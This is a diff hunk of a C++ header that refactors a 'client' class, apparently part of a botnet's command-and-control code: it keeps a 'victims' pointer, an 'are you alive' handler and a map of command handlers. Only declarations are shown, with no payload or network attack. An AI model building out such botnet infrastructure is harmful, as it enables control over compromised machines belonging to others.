@@ -26,31 +26,26 @@ using err = boost::system::error_code;
 
 class client {
     public:
-	enum command_code {
-		eARE_YOU_ALIVE,
-		eCOMMAND_NOT_FOUND,
-	};
-
 	client(io::io_context &, std::uint16_t, std::string, std::uint16_t, victims *);
 	void start();
 
     private:
+	void accept();
+	void onAccept(err error_code);
+    
 	void handleResponse(std::string &, session *);
 	void handleAlive(std::vector<std::string> &, session *);
 
-	void accept();
-	void onAccept(err error_code);
-
-	std::unordered_map<std::string, std::function<void(std::vector<std::string> &, session *)>> commands_;
-
-	io::io_context &io_context;
-	tcp::acceptor acceptor;
+	io::io_context &io_context_;
+	tcp::acceptor acceptor_;
 	std::optional<tcp::socket> socket_;
 	std::string server_ip_;
 	std::uint16_t server_port_;
-	std::vector<std::shared_ptr<session>> tmp_vect_for_session_;
+
+	std::vector<std::shared_ptr<session>> server_session_container_;
 	msg_parser msg_parser_;
 	victims *victims_;
+	std::unordered_map<std::string, std::function<void(std::vector<std::string> &, session *)>> command_handlers_;
 };
 
 #endif	// BOTNET_CLIENT_CLIENT_H
